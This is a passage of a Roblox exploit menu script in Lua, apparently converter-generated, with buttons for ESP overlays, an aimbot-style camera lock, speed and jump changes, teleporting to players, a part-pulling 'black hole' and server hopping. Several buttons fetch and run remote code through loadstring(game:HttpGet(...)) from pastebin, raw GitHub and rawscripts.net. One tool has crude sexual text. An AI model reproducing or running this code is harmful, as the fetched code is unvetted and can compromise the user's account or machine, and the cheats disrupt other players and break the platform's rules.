	button.MouseButton1Click:Connect(function()
		if not toggled then
			-- save original transparency and set to 0.4
			for _, part in pairs(workspace:GetDescendants()) do
				if part:IsA("BasePart") then
					local model = part:FindFirstAncestorWhichIsA("Model")
					if not (model and model:FindFirstChildOfClass("Humanoid")) then
						originalTransparency[part] = part.Transparency
						part.Transparency = 0.4
					end
				end
			end
			toggled = true
		else
			-- restore original transparency
			for part, transparency in pairs(originalTransparency) do
				if part and part.Parent then
					part.Transparency = transparency
				end
			end
			toggled = false
		end
	end)
	
end
coroutine.wrap(RJUHCF_fake_script)()
local function BDJMM_fake_script() -- triggerbot.LocalScript 
	local script = Instance.new('LocalScript', triggerbot)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/slutslovedata/home-utils/refs/heads/main/softaim%20/hood/bin/local/source.txt"))()
	end)
	
end
coroutine.wrap(BDJMM_fake_script)()
local function RRMYAP_fake_script() -- serverhop.LocalScript 
	local script = Instance.new('LocalScript', serverhop)

	local Players = game:GetService("Players")
	local TeleportService = game:GetService("TeleportService")
	local HttpService = game:GetService("HttpService")
	
	local player = Players.LocalPlayer
	local placeId = game.PlaceId
	
	local button = script.Parent  -- assuming this LocalScript is inside the button
	
	local function getRandomServer()
		local servers = {}
		local success, result = pcall(function()
			return game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"))
		end)
		if success and result and result.data then
			for _, server in pairs(result.data) do
				if server.playing < server.maxPlayers and server.id ~= game.JobId then
					table.insert(servers, server.id)
				end
			end
		end
		if #servers > 0 then
			return servers[math.random(1, #servers)]
		else
			return nil
		end
	end
	
	button.MouseButton1Click:Connect(function()
		local serverId = getRandomServer()
		if serverId then
			TeleportService:TeleportToPlaceInstance(placeId, serverId, player)
		else
			-- fallback if no server found, just rejoin same server
			TeleportService:Teleport(placeId, player)
		end
	end)
	
end
coroutine.wrap(RRMYAP_fake_script)()
local function WCOSBSS_fake_script() -- SPEED.LocalScript 
	local script = Instance.new('LocalScript', SPEED)

	-- LocalScript inside the TextBox
	
	local Players = game:GetService("Players")
	local StarterGui = game:GetService("StarterGui")
	local player = Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	
	local textBox = script.Parent
	
	textBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			local speed = tonumber(textBox.Text)
			if speed then
				humanoid.WalkSpeed = speed
	
				-- Show Roblox notification
				StarterGui:SetCore("SendNotification", {
					Title = "Speed Changed",
					Text = "Your speed is now " .. speed,
					Duration = 3
				})
			else
				StarterGui:SetCore("SendNotification", {
					Title = "Error",
					Text = "Please enter a number!",
					Duration = 3
				})
			end
		end
	end)
	
end
coroutine.wrap(WCOSBSS_fake_script)()
local function ERPDUCK_fake_script() -- ESP.LocalScript 
	local script = Instance.new('LocalScript', ESP)

	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local camera = workspace.CurrentCamera
	local player = Players.LocalPlayer
	local button = script.Parent
	
	local espEnabled = false
	local lines = {} -- store drawing lines per player
	local names = {} -- store text drawings per player
	
	-- Create ESP for a player
	local function createESP(targetPlayer)
		if targetPlayer == player or lines[targetPlayer] then return end
	
		-- Line
		local line = Drawing.new("Line")
		line.Color = Color3.new(1, 0, 0)
		line.Thickness = 1 -- thinner
		line.Transparency = 1
		line.Visible = true
		lines[targetPlayer] = line
	
		-- Name
		local nameText = Drawing.new("Text")
		nameText.Text = targetPlayer.Name
		nameText.Size = 14
		nameText.Color = Color3.new(1, 1, 1)
		nameText.Center = true
		nameText.Outline = true
		nameText.OutlineColor = Color3.new(0,0,0)
		nameText.Visible = true
		names[targetPlayer] = nameText
	
		-- Update each frame
		RunService.RenderStepped:Connect(function()
			if espEnabled and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
				local headPos, onScreen = camera:WorldToViewportPoint(targetPlayer.Character.Head.Position)
				if onScreen then
					line.From = Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y) -- bottom middle
					line.To = Vector2.new(headPos.X, headPos.Y)
					line.Visible = true
	
					nameText.Position = Vector2.new(headPos.X, headPos.Y - 20)
					nameText.Visible = true
				else
					line.Visible = false
					nameText.Visible = false
				end
			else
				line.Visible = false
				nameText.Visible = false
			end
		end)
	
		-- Remove when player leaves
		targetPlayer.AncestryChanged:Connect(function()
			if not targetPlayer:IsDescendantOf(game) then
				line:Remove()
				nameText:Remove()
				lines[targetPlayer] = nil
				names[targetPlayer] = nil
			end
		end)
	
		-- Recreate on respawn
		targetPlayer.CharacterAdded:Connect(function()
			if espEnabled then
				createESP(targetPlayer)
			end
		end)
	end
	
	-- Remove all ESP
	local function removeAllESP()
		for _, l in pairs(lines) do l:Remove() end
		for _, t in pairs(names) do t:Remove() end
		lines = {}
		names = {}
	end
	
	-- Toggle ESP
	local function toggleESP()
		espEnabled = not espEnabled
		if espEnabled then
			for _, p in pairs(Players:GetPlayers()) do
				createESP(p)
			end
		else
			removeAllESP()
		end
	end
	
	button.MouseButton1Click:Connect(toggleESP)
	
	-- Track new players
	Players.PlayerAdded:Connect(function(p)
		if espEnabled then
			createESP(p)
		end
	end)
	
end
coroutine.wrap(ERPDUCK_fake_script)()
local function QHKYM_fake_script() -- invis.LocalScript 
	local script = Instance.new('LocalScript', invis)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
	end)
	
	
	
	
	
	
end
coroutine.wrap(QHKYM_fake_script)()
local function AMXO_fake_script() -- lock.LocalScript 
	local script = Instance.new('LocalScript', lock)

	local button = script.Parent
	local player = game.Players.LocalPlayer
	local mouse = player:GetMouse()
	local runService = game:GetService("RunService")
	local uis = game:GetService("UserInputService")
	local players = game:GetService("Players")
	local lockActive = false
	local lockedPlayer = nil
	local lockKey = nil
	local highlight = nil
	local canToggle = true -- button cooldown
	
	-- Notification function
	local function notify(title, text, icon)
		game.StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 3,
			Icon = icon or ""
		})
	end
	
	-- Function to create red box
	local function makeBox(targetChar)
		if highlight then highlight:Destroy() end
		highlight = Instance.new("Highlight")
		highlight.Parent = targetChar
		highlight.FillTransparency = 1
		highlight.OutlineColor = Color3.new(1,0,0)
		highlight.OutlineTransparency = 0
	end
	
	-- Function to get nearest player under mouse
	local function getPlayerUnderMouse()
		local maxDistance = 100
		local mousePos = mouse.Hit.Position
		local closestPlayer = nil
		local closestDist = maxDistance
	
		for _, plr in pairs(players:GetPlayers()) do
			if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
				local dist = (plr.Character.HumanoidRootPart.Position - mousePos).Magnitude
				if dist < closestDist then
					closestDist = dist
					closestPlayer = plr
				end
			end
		end
	
		return closestPlayer
	end
	
	-- Start 3 second cooldown for button
	local function startCooldown()
		canToggle = false
		for i = 3, 1, -1 do
			button.Text = tostring(i)
			task.wait(1)
		end
		button.Text = lockActive and "Lock-On: ON" or "Lock-On: OFF"
		canToggle = true
	end
	
	-- Button toggle
	button.MouseButton1Click:Connect(function()
		if not canToggle then return end
	
		-- Toggle lock state immediately
		lockActive = not lockActive
		lockedPlayer = nil
		lockKey = nil
		if highlight then highlight:Destroy() end
	
		button.Text = lockActive and "Lock-On: ON" or "Lock-On: OFF"
	
		if lockActive then
			notify("Lock-On", "Enabled - Press a key to bind for lock")
		else
			notify("Lock-On", "Disabled")
		end
	
		-- Start cooldown for next toggle
		task.spawn(startCooldown)
	end)
	
	-- Keybind choosing + lock toggle
	uis.InputBegan:Connect(function(input, processed)
		if processed or not lockActive then return end
	
		-- Choosing keybind
		if not lockKey then
			if input.UserInputType == Enum.UserInputType.Keyboard then
				lockKey = input.KeyCode
				notify("Lock-On", "Bound key: " .. tostring(lockKey.Name))
			end
			return
		end
	
		-- Using the lock key
		if input.KeyCode == lockKey then
			if lockedPlayer then
				notify("Lock-On", "Unlocked from " .. lockedPlayer.Name)
				lockedPlayer = nil
				if highlight then highlight:Destroy() end
			else
				local target = getPlayerUnderMouse()
				if target then
					lockedPlayer = target
					makeBox(target.Character)
	
					-- Profile picture
					local thumb = players:GetUserThumbnailAsync(target.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
					notify("Lock-On", "LOCKED ONTO " .. target.Name, thumb)
				end
			end
		end
	end)
	
	-- Rotate camera towards locked player
	runService.RenderStepped:Connect(function()
		if lockActive and lockedPlayer and lockedPlayer.Character then
			local root = lockedPlayer.Character:FindFirstChild("HumanoidRootPart")
			if root then
				local cam = workspace.CurrentCamera
				cam.CFrame = CFrame.new(cam.CFrame.Position, root.Position)
			end
		end
	end)
	
end
coroutine.wrap(AMXO_fake_script)()
local function WSLSB_fake_script() -- infiniteyield.LocalScript 
	local script = Instance.new('LocalScript', infiniteyield)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Infinite-Yield-43437"))()
	end)
	
end
coroutine.wrap(WSLSB_fake_script)()
local function YLCH_fake_script() -- flingall.LocalScript 
	local script = Instance.new('LocalScript', flingall)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
	
	end)
	
end
coroutine.wrap(YLCH_fake_script)()
local function NNEAFYG_fake_script() -- splitsectp.LocalScript 
	local script = Instance.new('LocalScript', splitsectp)

	-- Teleport to all players script
	local player = game.Players.LocalPlayer
	
	script.Parent.MouseButton1Click:Connect(function()
		local character = player.Character or player.CharacterAdded:Wait()
		local hrp = character:WaitForChild("HumanoidRootPart")
		local originalCFrame = hrp.CFrame -- Save original position
	
		local players = game.Players:GetPlayers()
		for _, target in ipairs(players) do
			if target ~= player and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
				local targetHRP = target.Character.HumanoidRootPart
				-- Teleport behind the player
				hrp.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 3)
				wait(0.8) -- Stay for 2 seconds
			end
		end
	
		-- Return to original spot
		hrp.CFrame = originalCFrame
	end)
	
end
coroutine.wrap(NNEAFYG_fake_script)()
local function FCRYO_fake_script() -- jumppower.LocalScript 
	local script = Instance.new('LocalScript', jumppower)

	-- LocalScript inside the TextBox
	local textBox = script.Parent
	local player = game.Players.LocalPlayer
	
	local function updateJumpPower(value)
		local character = player.Character or player.CharacterAdded:Wait()
		local humanoid = character:WaitForChild("Humanoid")
	
		local num = tonumber(value)
		if num then
			humanoid.UseJumpPower = true  -- ensures jump power works
			humanoid.JumpPower = num
	
			-- Notification
			game.StarterGui:SetCore("SendNotification", {
				Title = "JumpPower Changed",
				Text = "Your JumpPower is now " .. num,
				Duration = 3
			})
		else
			-- Notification for invalid input
			game.StarterGui:SetCore("SendNotification", {
				Title = "Invalid Input",
				Text = "Please enter a number",
				Duration = 3
			})
		end
	end
	
	textBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			updateJumpPower(textBox.Text)
		end
	end)
	
end
coroutine.wrap(FCRYO_fake_script)()
local function KFSFI_fake_script() -- Teleport.LocalScript 
	local script = Instance.new('LocalScript', Teleport)

	-- LocalScript inside the TextBox
	local TextBox = script.Parent
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	-- find closest matching player
	local function findClosestPlayer(input)
		input = string.lower(input)
		local bestMatch = nil
		local bestScore = math.huge
	
		for _, player in ipairs(Players:GetPlayers()) do
			local possibleNames = {
				string.lower(player.Name),
				string.lower(player.DisplayName),
				tostring(player.UserId)
			}
	
			for _, name in ipairs(possibleNames) do
				local pos = string.find(name, input, 1, true)
				if pos then
					local score = pos + math.abs(#name - #input)
					if score < bestScore then
						bestScore = score
						bestMatch = player
					end
				end
			end
		end
	
		return bestMatch
	end
	
	TextBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			local input = TextBox.Text
			if input == "" then return end
	
			local target = findClosestPlayer(input)
			if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
				local char = LocalPlayer.Character
				if char and char:FindFirstChild("HumanoidRootPart") then
					char:MoveTo(target.Character.HumanoidRootPart.Position + Vector3.new(0, 3, 0))
				end
			end
		end
	end)
	
end
coroutine.wrap(KFSFI_fake_script)()
local function ULPW_fake_script() -- NameLabel.LocalScript 
	local script = Instance.new('LocalScript', NameLabel)

	local Players = game:GetService("Players")
	local label = script.Parent
	local player = Players.LocalPlayer
	
	-- use DisplayName or Name (change if you like)
	label.Text = player.DisplayName
	
end
coroutine.wrap(ULPW_fake_script)()
local function RXBJKD_fake_script() -- TextLabel_8.LocalScript 
	local script = Instance.new('LocalScript', TextLabel_8)

	local textLabel = script.Parent -- put this LocalScript inside the TextLabel
	
	-- lighter soft colours
	local colors = {
		Color3.fromRGB(120, 50, 120),
		Color3.fromRGB(50, 120, 120),
		Color3.fromRGB(120, 120, 50),
		Color3.fromRGB(80, 80, 80),
		Color3.fromRGB(100, 40, 90),
		Color3.fromRGB(40, 100, 60),
		Color3.fromRGB(70, 90, 40),
		Color3.fromRGB(90, 70, 90),
		Color3.fromRGB(110, 60, 110)
	}
	
	local function lerpColor(a, b, t)
		return a:Lerp(b, t)
	end
	
	while true do
		for i = 1, #colors do
			local nextIndex = i % #colors + 1
			for t = 0, 1, 0.02 do -- smooth fade speed
				textLabel.TextColor3 = lerpColor(colors[i], colors[nextIndex], t)
				wait(0.03)
			end
		end
	end
	
end
coroutine.wrap(RXBJKD_fake_script)()
local function YLGJRVJ_fake_script() -- zombieanim.LocalScript 
	local script = Instance.new('LocalScript', zombieanim)

	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- zombie animation ids
	local zombieAnims = {
		walk = "http://www.roblox.com/asset/?id=616168032",
		run = "http://www.roblox.com/asset/?id=616163682",
		jump = "http://www.roblox.com/asset/?id=616161997",
		idle = "http://www.roblox.com/asset/?id=616158929",
		fall = "http://www.roblox.com/asset/?id=616157476",
		climb = "http://www.roblox.com/asset/?id=616156119"
	}
	
	local function applyZombieAnimations(character)
		local animate = character:WaitForChild("Animate")
	
		animate.walk.WalkAnim.AnimationId = zombieAnims.walk
		animate.run.RunAnim.AnimationId = zombieAnims.run
		animate.jump.JumpAnim.AnimationId = zombieAnims.jump
		animate.idle.Animation1.AnimationId = zombieAnims.idle
		animate.fall.FallAnim.AnimationId = zombieAnims.fall
		animate.climb.ClimbAnim.AnimationId = zombieAnims.climb
	end
	
	-- button click effect
	local normalSize = UDim2.new(0, 503, 0, 23)
	local shrinkSize = UDim2.new(0, 483, 0, 20) -- slightly smaller
	
	local function clickEffect(btn)
		local tweenIn = TweenService:Create(btn, TweenInfo.new(0.1), {Size = shrinkSize})
		local tweenOut = TweenService:Create(btn, TweenInfo.new(0.1), {Size = normalSize})
		tweenIn:Play()
		tweenIn.Completed:Wait()
		tweenOut:Play()
	end
	
	-- when button clicked
	button.MouseButton1Click:Connect(function()
		if player.Character then
			applyZombieAnimations(player.Character)
		end
		clickEffect(button)
	end)
	
end
coroutine.wrap(YLGJRVJ_fake_script)()
local function CMPYF_fake_script() -- bubblyanim.LocalScript 
	local script = Instance.new('LocalScript', bubblyanim)

	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- bubbly animation ids
	local bubblyAnims = {
		walk = "http://www.roblox.com/asset/?id=910005397",
		run = "http://www.roblox.com/asset/?id=910025107",
		jump = "http://www.roblox.com/asset/?id=910016857",
		idle1 = "http://www.roblox.com/asset/?id=910009958",
		idle2 = "http://www.roblox.com/asset/?id=910009958",
		fall = "http://www.roblox.com/asset/?id=910001910",
		climb = "http://www.roblox.com/asset/?id=910001910"
	}
	
	local function applyBubblyAnimations(character)
		local animate = character:WaitForChild("Animate")
	
		animate.walk.WalkAnim.AnimationId = bubblyAnims.walk
		animate.run.RunAnim.AnimationId = bubblyAnims.run
		animate.jump.JumpAnim.AnimationId = bubblyAnims.jump
		animate.idle.Animation1.AnimationId = bubblyAnims.idle1
		animate.idle.Animation2.AnimationId = bubblyAnims.idle2
		animate.fall.FallAnim.AnimationId = bubblyAnims.fall
		animate.climb.ClimbAnim.AnimationId = bubblyAnims.climb
	end
	
	-- button click effect
	local normalSize = UDim2.new(0, 503, 0, 23)
	local shrinkSize = UDim2.new(0, 483, 0, 20) -- slightly smaller
	
	local function clickEffect(btn)
		local tweenIn = TweenService:Create(btn, TweenInfo.new(0.1), {Size = shrinkSize})
		local tweenOut = TweenService:Create(btn, TweenInfo.new(0.1), {Size = normalSize})
		tweenIn:Play()
		tweenIn.Completed:Wait()
		tweenOut:Play()
	end
	
	-- when button clicked
	button.MouseButton1Click:Connect(function()
		if player.Character then
			applyBubblyAnimations(player.Character)
		end
		clickEffect(button)
	end)
	
end
coroutine.wrap(CMPYF_fake_script)()
local function TICBXL_fake_script() -- cartoonanim.LocalScript 
	local script = Instance.new('LocalScript', cartoonanim)

	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- cartoony animation ids
	local cartoonyAnims = {
		walk = "http://www.roblox.com/asset/?id=742282033",
		run = "http://www.roblox.com/asset/?id=742638842",
		jump = "http://www.roblox.com/asset/?id=742637942",
		idle1 = "http://www.roblox.com/asset/?id=742637544",
		idle2 = "http://www.roblox.com/asset/?id=742637628",
		fall = "http://www.roblox.com/asset/?id=742636889",
		climb = "http://www.roblox.com/asset/?id=742636889"
	}
	
	local function applyCartoonyAnimations(character)
		local animate = character:WaitForChild("Animate")
	
		animate.walk.WalkAnim.AnimationId = cartoonyAnims.walk
		animate.run.RunAnim.AnimationId = cartoonyAnims.run
		animate.jump.JumpAnim.AnimationId = cartoonyAnims.jump
		animate.idle.Animation1.AnimationId = cartoonyAnims.idle1
		animate.idle.Animation2.AnimationId = cartoonyAnims.idle2
		animate.fall.FallAnim.AnimationId = cartoonyAnims.fall
		animate.climb.ClimbAnim.AnimationId = cartoonyAnims.climb
	end
	
	-- button click effect
	local normalSize = UDim2.new(0, 503, 0, 23)
	local shrinkSize = UDim2.new(0, 483, 0, 20) -- slightly smaller
	
	local function clickEffect(btn)
		local tweenIn = TweenService:Create(btn, TweenInfo.new(0.1), {Size = shrinkSize})
		local tweenOut = TweenService:Create(btn, TweenInfo.new(0.1), {Size = normalSize})
		tweenIn:Play()
		tweenIn.Completed:Wait()
		tweenOut:Play()
	end
	
	-- when button clicked
	button.MouseButton1Click:Connect(function()
		if player.Character then
			applyCartoonyAnimations(player.Character)
		end
		clickEffect(button)
	end)
	
end
coroutine.wrap(TICBXL_fake_script)()
local function LFPK_fake_script() -- summonfriends.LocalScript 
	local script = Instance.new('LocalScript', summonfriends)

	local Players = game:GetService("Players")
	local localPlayer = Players.LocalPlayer
	
	-- This script is inside the TextButton
	local button = script.Parent
	
	-- Feature state
	local summonEnabled = false
	
	-- Function to send notification
	local function notify(text)
		game.StarterGui:SetCore("SendNotification", {
			Title = "Summon Feature",
			Text = text,
			Duration = 3
		})
	end
	
	-- Toggle function
	local function toggleSummon()
		summonEnabled = not summonEnabled
		notify("Summon is " .. (summonEnabled and "ON" or "OFF"))
	end
	
	-- Connect button click
	button.MouseButton1Click:Connect(toggleSummon)
	
	-- Function to teleport to friend
	local function onPlayerChatted(player, message)
		if summonEnabled and message == "!summon" and localPlayer:IsFriendsWith(player.UserId) then
			local character = player.Character
			if character and character:FindFirstChild("HumanoidRootPart") then
				localPlayer.Character:SetPrimaryPartCFrame(character.HumanoidRootPart.CFrame + Vector3.new(0,3,0))
			end
		end
	end
	
	-- Connect existing players
	for _, player in pairs(Players:GetPlayers()) do
		player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
	end
	
	-- Connect new players
	Players.PlayerAdded:Connect(function(player)
		player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
	end)
	
end
coroutine.wrap(LFPK_fake_script)()
local function MIVBUJP_fake_script() -- jork.LocalScript 
	local script = Instance.new('LocalScript', jork)

	local player = game.Players.LocalPlayer
	local button = script.Parent  -- the button you press
	
	button.MouseButton1Click:Connect(function()
		local backpack = player:WaitForChild("Backpack")
	
		local tool = Instance.new("Tool")
		tool.Name = "w6nk 0ff"
		tool.ToolTip = "Will you take the risk..? the risk of exposing your tiny dick into the air."
		tool.RequiresHandle = false
		tool.Parent = backpack
	
		local jorkin = false
		local track = nil
		local humanoid = player.Character and player.Character:FindFirstChildWhichIsA("Humanoid")
	
		local function updateHumanoid()
			if player.Character then
				humanoid = player.Character:WaitForChild("Humanoid")
			end
		end
		if not humanoid then updateHumanoid() end
		if not humanoid then return end
	
		local function stopTomfoolery()
			jorkin = false
			if track then
				track:Stop()
				track = nil
			end
		end
	
		local function isR15(character)
			return character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R15
		end
	
		local function playAnimation()
			if not jorkin then return end
	
			local isR15Model = isR15(player.Character)
			if not track then
				local anim = Instance.new("Animation")
				anim.AnimationId = isR15Model and "rbxassetid://79810074965766" or "rbxassetid://72042024"
	
				local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:FindFirstChildWhichIsA("AnimationController")
				if not animator then
					animator = Instance.new("Animator")
					animator.Parent = humanoid
				end
	
				track = animator:LoadAnimation(anim)
			end
	
			if track then
				track:Play()
				track:AdjustSpeed(isR15Model and 0.7 or 0.65)
				track.TimePosition = 0.6
	
				while track and track.IsPlaying and track.TimePosition < (isR15Model and 0.65 or 0.7) do
					task.wait(0.1)
				end
	
				track:Stop()
				track = nil
			end
		end
	
		tool.Equipped:Connect(function()
			jorkin = true
		end)
	
		tool.Unequipped:Connect(stopTomfoolery)
		humanoid.Died:Connect(stopTomfoolery)
	
		tool.Activated:Connect(function()
			if jorkin then
				playAnimation()
			end
		end)
	end)
	
end
coroutine.wrap(MIVBUJP_fake_script)()
local function DXNGUWE_fake_script() -- blackhole.LocalScript 
	local script = Instance.new('LocalScript', blackhole)

	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local LocalPlayer = Players.LocalPlayer
	local Workspace = game:GetService("Workspace")
	
	-- Your custom button (make sure this script is a child of the button)
	local Button = script.Parent
	
	-- Invisible black hole part
	local Folder = Instance.new("Folder", Workspace)
	local Part = Instance.new("Part", Folder)
	local Attachment1 = Instance.new("Attachment", Part)
	Part.Anchored = true
	Part.CanCollide = false
	Part.Transparency = 1
	
	-- Network setup
	if not getgenv().Network then
		getgenv().Network = {
			BaseParts = {},
			Velocity = Vector3.new(14,14,14)
		}
	
		Network.RetainPart = function(p)
			if p:IsA("BasePart") and p:IsDescendantOf(Workspace) then
				table.insert(Network.BaseParts, p)
				p.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
				p.CanCollide = false
			end
		end
	
		LocalPlayer.ReplicationFocus = Workspace
		RunService.Heartbeat:Connect(function()
			sethiddenproperty(LocalPlayer,"SimulationRadius",math.huge)
			for _,p in pairs(Network.BaseParts) do
				if p:IsDescendantOf(Workspace) then
					p.Velocity = Network.Velocity
				end
			end
		end)
	end
	
	-- Force parts to follow black hole
	local function ForcePart(v)
		if v:IsA("BasePart") and not v.Anchored and not v.Parent:FindFirstChildOfClass("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
			for _,x in ipairs(v:GetChildren()) do
				if x:IsA("BodyMover") or x:IsA("RocketPropulsion") then
					x:Destroy()
				end
			end
			if v:FindFirstChild("Attachment") then v.Attachment:Destroy() end
			if v:FindFirstChild("AlignPosition") then v.AlignPosition:Destroy() end
			if v:FindFirstChild("Torque") then v.Torque:Destroy() end
	
			v.CanCollide = false
			local Torque = Instance.new("Torque",v)
			Torque.Torque = Vector3.new(100000,100000,100000)
			local AlignPosition = Instance.new("AlignPosition",v)
			local Attachment2 = Instance.new("Attachment",v)
			Torque.Attachment0 = Attachment2
			AlignPosition.MaxForce = math.huge
			AlignPosition.MaxVelocity = math.huge
			AlignPosition.Responsiveness = 200
			AlignPosition.Attachment0 = Attachment2
			AlignPosition.Attachment1 = Attachment1
		end
	end
	
	-- Notifications
	local function notify(text)
		local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
		if playerGui then
			local notif = Instance.new("ScreenGui", playerGui)
			local msg = Instance.new("TextLabel", notif)
			msg.Size = UDim2.new(1,0,0.1,0)
			msg.Position = UDim2.new(0,0,0,0)
			msg.Text = text
			msg.TextColor3 = Color3.new(1,1,1)
			msg.BackgroundTransparency = 0.5
			msg.BackgroundColor3 = Color3.new(0,0,0)
			msg.TextScaled = true
			delay(2, function() notif:Destroy() end)
		end
	end
	
	-- Toggle black hole
	local blackHoleActive = false
	local DescendantAddedConnection
	local character
	local humanoidRootPart
	
	local function toggleBlackHole()
		blackHoleActive = not blackHoleActive
	
		if blackHoleActive then
			notify("Black Hole Activated! Press again to turn off.")
			Button.Text = "Black Hole | On"
	
			if LocalPlayer.Character then
				character = LocalPlayer.Character
				humanoidRootPart = character:WaitForChild("HumanoidRootPart")
			else
				character = LocalPlayer.CharacterAdded:Wait()
				humanoidRootPart = character:WaitForChild("HumanoidRootPart")
			end
	
			for _,v in ipairs(Workspace:GetDescendants()) do
				ForcePart(v)
			end
	
			DescendantAddedConnection = Workspace.DescendantAdded:Connect(function(v)
				if blackHoleActive then
					ForcePart(v)
				end
			end)
	
			spawn(function()
				while blackHoleActive and RunService.RenderStepped:Wait() do
					Attachment1.WorldCFrame = humanoidRootPart.CFrame
				end
			end)
	
		else
			notify("Black Hole Deactivated!")
			Button.Text = "Black Hole | Off"
			if DescendantAddedConnection then
				DescendantAddedConnection:Disconnect()
			end
		end
	end
	
	-- Button click connects to toggle
	Button.MouseButton1Click:Connect(toggleBlackHole)
	
end
coroutine.wrap(DXNGUWE_fake_script)()
local function FMHGYPQ_fake_script() -- MAIN.Smooth GUI Dragging 
	local script = Instance.new('LocalScript', MAIN)

	local UserInputService = game:GetService("UserInputService")
	local runService = (game:GetService("RunService"));
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	function Lerp(a, b, m)
		return a + (b - a) * m
	end;
	
	local lastMousePos
	local lastGoalPos
	local DRAG_SPEED = (8); -- // The speed of the UI darg.
	function Update(dt)
		if not (startPos) then return end;
		if not (dragging) and (lastGoalPos) then
			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
			return 
		end;
	
		local delta = (lastMousePos - UserInputService:GetMouseLocation())
		local xGoal = (startPos.X.Offset - delta.X);
		local yGoal = (startPos.Y.Offset - delta.Y);
		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
	end;
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			lastMousePos = UserInputService:GetMouseLocation()
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	runService.Heartbeat:Connect(Update)
end
coroutine.wrap(FMHGYPQ_fake_script)()
local function FCISS_fake_script() -- ImageButton.LocalScript 
	local script = Instance.new('LocalScript', ImageButton)

	-- LocalScript inside the ImageButton
	
	local button = script.Parent
	local targetFrame = button.Parent -- the frame to open/close
	local visible = true
	
	local function toggle()
		visible = not visible
		targetFrame.Visible = visible
	end
	
	-- Click button to toggle
	button.MouseButton1Click:Connect(toggle)
	
	-- Press X to toggle
	local UserInputService = game:GetService("UserInputService")
	UserInputService.InputBegan:Connect(function(input, gp)
		if gp then return end
		if input.KeyCode == Enum.KeyCode.X then
			toggle()
		end
	end)
	
end
coroutine.wrap(FCISS_fake_script)()
local function KOSD_fake_script() -- ImageButton_2.LocalScript 
	local script = Instance.new('LocalScript', ImageButton_2)

	local button = script.Parent
	
	-- create the first sound inside the button
	local sound1 = Instance.new("Sound")
	sound1.Name = "Music1"
	sound1.SoundId = "rbxassetid://90930311711593"
	sound1.Looped = true
	sound1.Volume = 0
	sound1.Parent = button
	
	-- create the second sound inside the button
	local sound2 = Instance.new("Sound")
	sound2.Name = "Music2"
	sound2.SoundId = "rbxassetid://1516791621"
	sound2.Looped = true
	sound2.Volume = 0
	sound2.Parent = button
	
	local muted = true
	
	-- wait 5 seconds then start the music
	task.wait(5)
	sound1:Play()
	sound2:Play()
	sound1.Volume = 0.2
	sound2.Volume = 0.1
	muted = false
	button.Image = "http://www.roblox.com/asset/?id=133328822613992"
	
	button.MouseButton1Click:Connect(function()
		if not muted then
			-- mute both sounds
			sound1.Volume = 0
			sound2.Volume = 0
			button.Image = "http://www.roblox.com/asset/?id=17698073882"
			muted = true
		else
			-- unmute both sounds
			sound1.Volume = 0.2
			sound2.Volume = 0.1
			button.Image = "http://www.roblox.com/asset/?id=133328822613992"
			muted = false
		end
	end)
	
end
coroutine.wrap(KOSD_fake_script)()
local function DESFK_fake_script() -- MAIN.LocalScript 
	local script = Instance.new('LocalScript', MAIN)

	-- LocalScript inside the Frame
